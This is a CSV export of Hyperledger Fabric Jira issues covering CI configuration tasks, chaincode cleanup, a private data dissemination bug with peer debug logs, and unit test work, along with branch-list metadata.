Update azp yml files to not trigger PTE daily builds for PR submission,FAB-17181,43529,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,04/Dec/19 1:31 AM,04/Dec/19 4:15 AM,28/Oct/23 3:09 AM,04/Dec/19 4:15 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Update azp yml files to not trigger PTE daily builds for PR submission,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16760,,,No,,Unset,No,,,"1|hzwqrk:5iwr4r7i",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Dec/19 4:01 AM;rameshthoomu;[https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34480/]

https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34479/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove orphan chaincode containers and images using operator while taking down the network,FAB-17182,43530,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,bharadwajambati1,bharadwajambati1,04/Dec/19 1:41 AM,10/Dec/19 5:40 AM,28/Oct/23 3:09 AM,09/Dec/19 3:31 PM,v1.4.4,v2.0.0,,,,,,,,v1.4.4,v2.0.0,,,fabric-quality,,,,,,,,,0,,,,,,,,bharadwajambati1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16240,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx2",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Dec/19 3:24 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/9/commits/07e56790849a4884409a5e742fa78ec22d2e78bd];;;","10/Dec/19 12:29 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/23/commits/1357f869c55309fd066745f0de070cfd3ae333f7] for release-1.4;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
operator and fabric test client support marbles02 priv with transient map,FAB-17183,43531,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,dongming,dongming,04/Dec/19 3:52 AM,11/Jan/21 2:31 AM,28/Oct/23 3:09 AM,11/Jan/21 2:31 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Once PTE supports transient map (FAB-15392), operator and fabric test client needs to support transient map too.
 * Update testInput file to accept the transient vars.
 * Update the operator to read them and pass to PTE.

 

AND then write a testtask using all of this great new code!",,btl5037,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15392,FAB-17367,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb8k",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:08 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Peer cannot find private data, but should skip pulling private data due to invalid transaction",FAB-17184,43533,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,denyeart,denyeart,04/Dec/19 4:22 AM,09/Jan/20 2:55 AM,28/Oct/23 3:09 AM,09/Jan/20 2:55 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"*Scenario:*
Chaincode writes to _implicit_org_Org1MSP. Invoke chaincode on Org2 peer.

Note Org1 peer has setting:
skipPullingInvalidTransactionsDuringCommit: true

*Expected behavior:*

Org2 attempts to endorse a transaction with implicit collection _implicit_org_Org1MSP.  The private data should disseminate to Org1, however the transaction will be marked as invalid due to endorsement policy failure.

*Actual behavior:*

Org1 peer appears to get the private data at endorsement time:

{code:java}
2019-12-03 14:01:31.998 EST [transientstore] Persist -> DEBU 050 Persisting private data to transient store for txid [697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013] at block height [45]
{code}

Issue 1: Org1 peer can't find private data in transient store

{code:java}
2019-12-03 14:01:34.060 EST [gossip.privdata] populateFromTransientStore -> WARN 05c The PvtRwset of PvtSimulationResultsWithConfig for txID [697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013] is nil. Skipping. channel=mychannel
{code}

The reason Org1 peer can't find the private data is because there is not yet any dissemination configuration for implicit collections... this is proposed to be added in FAB-17303.

Issue 2: Peer should skip pulling private data for invalid transactions, but it attempts to pull anyways.

*Full Org1 peer log at commit time:*

{code:java}
2019-12-03 14:01:34.056 EST [gossip.privdata] StoreBlock -> INFO 051 [mychannel] Received block [45] from buffer
2019-12-03 14:01:34.056 EST [gossip.privdata] StoreBlock -> DEBU 052 [mychannel] Validating block [45]
2019-12-03 14:01:34.059 EST [vscc] Validate -> ERRO 053 VSCC error: stateBasedValidator.Validate failed, err validation of endorsement policy for collection _implicit_org_Org1MSP chaincode marblesp in tx 45:0 failed: signature set did not satisfy policy
2019-12-03 14:01:34.059 EST [committer.txvalidator] validateTx -> ERRO 054 Dispatch for transaction txId = 697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013 returned error: validation of endorsement policy for collection _implicit_org_Org1MSP chaincode marblesp in tx 45:0 failed: signature set did not satisfy policy
2019-12-03 14:01:34.059 EST [committer.txvalidator] Validate -> INFO 055 [mychannel] Validated block [45] in 2ms
2019-12-03 14:01:34.060 EST [gossip.privdata] endorsersFromEligibleOrgs -> DEBU 056 Org2MSP isn't among the collection's orgs: [Org1MSP] for namespace marblesp ,collection _implicit_org_Org1MSP
2019-12-03 14:01:34.060 EST [gossip.privdata] populateFromCache -> DEBU 057 Attempting to retrieve 2 private write sets from cache. channel=mychannel
2019-12-03 14:01:34.060 EST [gossip.privdata] RetrievePvtdata -> DEBU 058 Could not find all collection private write sets in cache for block [45] channel=mychannel
2019-12-03 14:01:34.060 EST [gossip.privdata] RetrievePvtdata -> DEBU 059 Fetching 2 collection private write sets from transient store channel=mychannel
2019-12-03 14:01:34.060 EST [gossip.privdata] populateFromTransientStore -> DEBU 05a Attempting to retrieve 2 private write sets from transient store. channel=mychannel
2019-12-03 14:01:34.060 EST [transientstore] GetTxPvtRWSetByTxid -> DEBU 05b Getting private data from transient store for transaction 697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013
2019-12-03 14:01:34.060 EST [gossip.privdata] populateFromTransientStore -> WARN 05c The PvtRwset of PvtSimulationResultsWithConfig for txID [697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013] is nil. Skipping. channel=mychannel
2019-12-03 14:01:34.060 EST [transientstore] GetTxPvtRWSetByTxid -> DEBU 05d Getting private data from transient store for transaction 697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013
2019-12-03 14:01:34.061 EST [gossip.privdata] RetrievePvtdata -> DEBU 05e Could not find all collection private write sets in local peer transient store for block [45] channel=mychannel
2019-12-03 14:01:34.061 EST [gossip.privdata] RetrievePvtdata -> DEBU 05f Fetching 1 collection private write sets from remote peers for a maximum duration of 10s channel=mychannel
2019-12-03 14:01:34.061 EST [gossip.privdata] populateFromRemotePeers -> DEBU 060 Attempting to retrieve 1 private write sets from remote peers. channel=mychannel
2019-12-03 14:01:34.061 EST [gossip.privdata] populateFromRemotePeers -> DEBU 061 Skipping invalid key [{697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013 0 marblesp _implicit_org_Org1MSP feea17dd8c6aa05fc7017040814624bc5c9ee311ece8cb7df8fb428f53e859b2}] because peer is configured to skip pulling rwsets of invalid transactions. channel=mychannel
2019-12-03 14:01:34.061 EST [gossip.privdata] fetchPrivateData -> DEBU 062 Total members in channel: [Endpoint: 127.0.0.1:7055, InternalEndpoint: , PKI-ID: dbbf31fb5385654e28cb34140b74287187fb33f91a8cc605ddc315b2aa60183d, Metadata: ]
2019-12-03 14:01:34.061 EST [gossip.privdata] fetchPrivateData -> DEBU 063 Total members that fit some digest: []
2019-12-03 14:01:34.061 EST [gossip.privdata] fetchPrivateData -> WARN 064 Do not know any peer in the channel( mychannel ) that matches the policies , aborting
2019-12-03 14:01:34.061 EST [gossip.privdata] populateFromRemotePeers -> WARN 065 Failed fetching private data from remote peers for dig2src:[map[]], err: Empty membership channel=mychannel
...
2019-12-03 14:01:43.083 EST [gossip.privdata] populateFromRemotePeers -> DEBU 096 Attempting to retrieve 1 private write sets from remote peers. channel=mychannel
2019-12-03 14:01:43.083 EST [gossip.privdata] populateFromRemotePeers -> DEBU 097 Skipping invalid key [{697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013 0 marblesp _implicit_org_Org1MSP feea17dd8c6aa05fc7017040814624bc5c9ee311ece8cb7df8fb428f53e859b2}] because peer is configured to skip pulling rwsets of invalid transactions. channel=mychannel
2019-12-03 14:01:43.084 EST [gossip.privdata] fetchPrivateData -> DEBU 098 Total members in channel: [Endpoint: 127.0.0.1:7055, InternalEndpoint: , PKI-ID: dbbf31fb5385654e28cb34140b74287187fb33f91a8cc605ddc315b2aa60183d, Metadata: ]
2019-12-03 14:01:43.084 EST [gossip.privdata] fetchPrivateData -> DEBU 099 Total members that fit some digest: []
2019-12-03 14:01:43.084 EST [gossip.privdata] fetchPrivateData -> WARN 09a Do not know any peer in the channel( mychannel ) that matches the policies , aborting
2019-12-03 14:01:43.084 EST [gossip.privdata] populateFromRemotePeers -> WARN 09b Failed fetching private data from remote peers for dig2src:[map[]], err: Empty membership channel=mychannel
2019-12-03 14:01:44.088 EST [gossip.privdata] RetrievePvtdata -> DEBU 09c Could not fetch all missing collection private write sets from remote peers for block [45] channel=mychannel
2019-12-03 14:01:44.088 EST [gossip.privdata] prepareBlockPvtdata -> WARN 09d Could not fetch all missing eligible collection private write sets for block [45]. Will commit block with missing private write sets:[txID: 697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013, seq: 0, namespace: marblesp, collection: _implicit_org_Org1MSP, hash: feea17dd8c6aa05fc7017040814624bc5c9ee311ece8cb7df8fb428f53e859b2
] channel=mychannel
2019-12-03 14:01:44.088 EST [kvledger] CommitLegacy -> DEBU 09e [mychannel] Validating state for block [45]
2019-12-03 14:01:44.088 EST [valimpl] preprocessProtoBlock -> WARN 09f Channel [mychannel]: Block [45] Transaction index [0] TxId [697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013] marked as invalid by committer. Reason code [ENDORSEMENT_POLICY_FAILURE]
2019-12-03 14:01:44.089 EST [kvledger] CommitLegacy -> DEBU 0a0 [mychannel] Adding CommitHash to the block [45]
2019-12-03 14:01:44.089 EST [kvledger] CommitLegacy -> DEBU 0a1 [mychannel] Committing block [45] to storage
2019-12-03 14:01:44.089 EST [ledgerstorage] CommitWithPvtData -> DEBU 0a2 Writing block [45] to pvt block store
2019-12-03 14:01:44.126 EST [kvledger] CommitLegacy -> DEBU 0a3 [mychannel] Committing block [45] transactions to state database
2019-12-03 14:01:44.136 EST [kvledger] CommitLegacy -> DEBU 0a4 [mychannel] Committing block [45] transactions to history database
2019-12-03 14:01:44.147 EST [kvledger] CommitLegacy -> INFO 0a5 [mychannel] Committed block [45] with 1 transaction(s) in 58ms (state_validation=0ms block_and_pvtdata_commit=37ms state_commit=10ms) commitHash=[bbeee83194e5dd8d4c45973e361a203c43071f876d72fd2e553e0fb20de6e708]
{code}
",,caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i008rj:iwryi",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,denyeart,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Dec/19 6:11 AM;caod;Regarding issue2, looks like it's still skipping:
{noformat}
2019-12-03 14:01:34.061 EST [gossip.privdata] populateFromRemotePeers -> DEBU 060 Attempting to retrieve 1 private write sets from remote peers. channel=mychannel
 2019-12-03 14:01:34.061 EST [gossip.privdata] populateFromRemotePeers -> DEBU 061 Skipping invalid key [\{697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013 0 marblesp _implicit_org_Org1MSP feea17dd8c6aa05fc7017040814624bc5c9ee311ece8cb7df8fb428f53e859b2}] because peer is configured to skip pulling rwsets of invalid transactions. channel=mychannel{noformat}
The log lines can look confusing though in this example since the way the pvtdataprovider works is it enters a retry loop for fetching from remote peers, prior to actually fetching from a peer it checks if the tx is invalid and if so just skips that attempt for that write set, this doesn't actually exit the retry loop so it will try again and skip the pull repeatedly until the pull retry loop exits (in this case once the threshold is reached). This behavior is intended such that if there are multiple missing write sets that need to be fetched from a peer (one of them being invalid), it won't quit the retry loop just because one of them is invalid. One edge case improvement for this case could be we quit the retry loop if we're only fetching write sets for invalid transactions.

 

Do you have the surrounding log lines for the dissemination/receipt of private data? It looks like two pvtdata write sets are being committed, the one added to transient store was the non implicit collection write set (that org 1 peer is able to receive). If you look at the pvtdata retrieval it attempts to first fetch 2 write sets from transient store and is successfully able to retrieve the one persisted during dissemination. The ineligible write set is the one we try to fetch from remote peer but gets skipped due to the skipPullingInvalidTx flag
{noformat}
2019-12-03 14:01:34.060 EST [gossip.privdata] RetrievePvtdata -> DEBU 059 Fetching 2 collection private write sets from transient store channel=mychannel
 2019-12-03 14:01:34.060 EST [gossip.privdata] populateFromTransientStore -> DEBU 05a Attempting to retrieve 2 private write sets from transient store. channel=mychannel
 2019-12-03 14:01:34.060 EST [transientstore] GetTxPvtRWSetByTxid -> DEBU 05b Getting private data from transient store for transaction 697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013
 2019-12-03 14:01:34.060 EST [gossip.privdata] populateFromTransientStore -> WARN 05c The PvtRwset of PvtSimulationResultsWithConfig for txID [697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013] is nil. Skipping. channel=mychannel
 2019-12-03 14:01:34.060 EST [transientstore] GetTxPvtRWSetByTxid -> DEBU 05d Getting private data from transient store for transaction 697d5471b1ce014251967dd6818ffa151dd719bb97ee8a8a54527f4200f20013
 2019-12-03 14:01:34.061 EST [gossip.privdata] RetrievePvtdata -> DEBU 05e Could not find all collection private write sets in local peer transient store for block [45] channel=mychannel
 2019-12-03 14:01:34.061 EST [gossip.privdata] RetrievePvtdata -> DEBU 05f Fetching 1 collection private write sets from remote peers for a maximum duration of 10s channel=mychannel
 2019-12-03 14:01:34.061 EST [gossip.privdata] populateFromRemotePeers -> DEBU 060 Attempting to retrieve 1 private write sets from remote peers. channel=mychannel{noformat};;;","06/Dec/19 12:14 AM;caod;[https://github.com/hyperledger/fabric/pull/365];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove LTE log reference from AZP build files,FAB-17185,43534,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,04/Dec/19 7:10 AM,05/Dec/19 11:28 PM,28/Oct/23 3:09 AM,05/Dec/19 11:28 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Remove LTE log reference from AZP build files from both master and release-1.4 branches,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4vi",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-1.4,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Dec/19 7:37 AM;rameshthoomu;[https://github.com/hyperledger/fabric-test/pull/10] - release-1.4;;;","05/Dec/19 11:28 PM;rameshthoomu;[https://github.com/hyperledger/fabric-test/pull/14.  |https://github.com/hyperledger/fabric-test/pull/14]master;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
epic summmary,FAB-17186,43537,,Epic,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,bharath22,bharath22,04/Dec/19 8:46 PM,04/Dec/19 8:51 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,bharath22,,,,,,,,,,,,,,,,,,,,,FAB-17187,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,ghx-label-12,,epic1create,To Do,No,,Unset,No,,,"1|i015or:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharath22,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ddddd,FAB-17187,43538,,Epic,Backlog,FAB,Fabric,software,denyeart,,,High,,bharath22,bharath22,bharath22,04/Dec/19 8:51 PM,04/Dec/19 8:55 PM,28/Oct/23 3:09 AM,,v2.1.0,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,bharath22,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17186,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Not Required,Unset,Required,ghx-label-2,,ddddddd,To Do,No,,Required,No,,,"1|i015oz:",,,,Yes,Required,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharath22,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add unit test for fetching revision from DB and cache,FAB-17188,43540,43310,Sub-task,In CR Review,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,04/Dec/19 11:20 PM,05/Dec/19 6:05 PM,28/Oct/23 3:09 AM,,,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"Add function level unit test for the following two functions defined in statecouchdb package.
 * addRevisionFromCache()
 * addRevisionFromDB()",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015pf:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
